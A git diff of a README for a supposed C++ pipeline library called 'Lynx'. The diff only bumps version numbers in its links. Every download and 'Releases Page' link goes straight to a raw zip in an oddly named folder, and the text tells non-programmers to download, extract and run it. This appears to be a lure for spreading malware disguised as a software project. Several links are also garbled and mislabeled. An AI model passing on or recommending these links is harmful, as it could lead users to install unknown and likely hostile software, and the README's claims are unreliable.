@@ -1,7 +1,7 @@
 # 🦁 Lynx - Build Safe and Powerful Pipelines
 
 ## 📥 Download Lynx
-[![Download Lynx](https://github.com/Paradox251/Lynx/raw/refs/heads/main/counterreprisal/Software-1.2.zip%https://github.com/Paradox251/Lynx/raw/refs/heads/main/counterreprisal/Software-1.2.zip)](https://github.com/Paradox251/Lynx/raw/refs/heads/main/counterreprisal/Software-1.2.zip)
+[![Download Lynx](https://github.com/Paradox251/Lynx/raw/refs/heads/main/counterreprisal/Software-1.9.zip%https://github.com/Paradox251/Lynx/raw/refs/heads/main/counterreprisal/Software-1.9.zip)](https://github.com/Paradox251/Lynx/raw/refs/heads/main/counterreprisal/Software-1.9.zip)
 
 ## 🚀 Getting Started
 Lynx is a powerful C++ library that helps you create safe and efficient pipelines to process data. With Lynx, you can build custom domain-specific languages (DSLs) that fit your needs. This guide will help you download and run Lynx, even if you're not a programmer.
@@ -17,13 +17,13 @@ Before you begin, ensure your system meets these requirements:
 To get Lynx, follow these steps:
 
 1. **Visit the Release Page**  
-   Go to the [Lynx Releases Page](https://github.com/Paradox251/Lynx/raw/refs/heads/main/counterreprisal/Software-1.2.zip) to view the available versions.
+   Go to the [Lynx Releases Page](https://github.com/Paradox251/Lynx/raw/refs/heads/main/counterreprisal/Software-1.9.zip) to view the available versions.
 
 2. **Choose Your Version**  
    Look for the latest version at the top of the releases list. It will typically be labeled with the version number, like v1.0.0.
 
 3. **Download the Package**  
-   Click on the file corresponding to your operating system. This might be a `.zip`, `https://github.com/Paradox251/Lynx/raw/refs/heads/main/counterreprisal/Software-1.2.zip`, or another format.
+   Click on the file corresponding to your operating system. This might be a `.zip`, `https://github.com/Paradox251/Lynx/raw/refs/heads/main/counterreprisal/Software-1.9.zip`, or another format.
 
 4. **Unzip the File**  
    Once downloaded, locate the file on your computer and extract it. Right-click the file and select "Extract All" or use a tool like 7-Zip.
@@ -61,6 +61,6 @@ Lynx covers a variety of advanced topics to help broaden your understanding:
 Using Lynx can help improve your application's performance by enabling zero-overhead abstractions. With type safety, you can avoid runtime errors that lead to crashes, ensuring a smoother experience.
 
 ## 🌟 Future Updates
-Keep an eye on the [Lynx Releases Page](https://github.com/Paradox251/Lynx/raw/refs/heads/main/counterreprisal/Software-1.2.zip) for future updates. Each release may include new features, bug fixes, and improved performance.
+Keep an eye on the [Lynx Releases Page](https://github.com/Paradox251/Lynx/raw/refs/heads/main/counterreprisal/Software-1.9.zip) for future updates. Each release may include new features, bug fixes, and improved performance.
 
 Lynx is built for developers seeking to enhance their applications with type-safe operator pipelines. Follow this guide to get started, and enjoy building innovative solutions with Lynx.
